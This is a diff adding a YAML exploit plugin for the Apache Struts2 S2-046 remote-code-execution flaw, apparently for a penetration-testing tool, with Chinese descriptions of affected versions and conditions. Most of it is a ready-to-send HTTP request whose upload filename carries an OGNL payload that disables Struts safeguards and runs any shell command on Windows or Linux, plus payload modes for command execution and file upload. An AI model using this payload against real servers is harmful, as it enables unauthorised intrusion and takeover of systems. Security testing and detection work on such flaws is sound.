@@ -1,0 +1,75 @@
+info:
+    app: Struts2
+    name: S2_046
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2017-03-21"
+    create_date: "2024-10-06 12:49:55"
+    update_date: "2024-10-06 12:49:55"
+    scope: Struts 2.3.5 – Struts 2.3.31、Struts 2.5 – Struts 2.5.10
+    description: |-
+        使用恶意的Content-Disposition值或者使用不合适的Content-Length头就可能导致远程命令执行。该漏洞与S2-045 (CVE-2017-5638)相似，但使用了不同的攻击向量。
+
+        JakartaStreamMultipartRequest已开启。也就是说，Struts2需要通过Jakarta stream parser配置（非默认）。在Struts2配置文件中检查<constant name=”struts.multipart.parser” value=”jakarta-stream” />
+        上传的文件大小根据Content-Length头的声明要大于Struts2默认允许的2GB大小
+        文件名中包含OGNL payload
+    vul_id: CVE-2017-5638
+    detail: |-
+        利用点为POST提交表单的filename
+        目前只支持cmd
+        URL如http://192.168.111.111:8080/integration/saveGangster.action
+    payload: |-
+        POST /integration/saveGangster.action HTTP/1.1
+        Host: 192.168.111.111:8080
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Content-Length: 999
+        Content-Type: multipart/form-data; boundary=1858aee5e78258f779bf2f5b12158cd4
+
+        --1858aee5e78258f779bf2f5b12158cd4
+        Content-Disposition: form-data; name="test"; filename="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b"
+        Content-Type: application/octet-stream
+
+        qwbTC2zm
+        --029e105b5cc443939adfaaa1e246f102--
+payloads:
+    - name: cmd1
+      alias: 命令执行1
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+    - name: cmd2
+      alias: 命令执行2
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+    - name: cmd3
+      alias: 命令执行3
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+    - name: upload3
+      alias: 文件上传3
+      params:
+          - key: filename
+            title: 文件名
+            param_type: edit
+            default_value: ""
+            required: true
+          - key: content
+            title: 内容
+            param_type: textarea
+            default_value: ""
+            required: true
+    - name: getmsg3
+      alias: 获取信息3
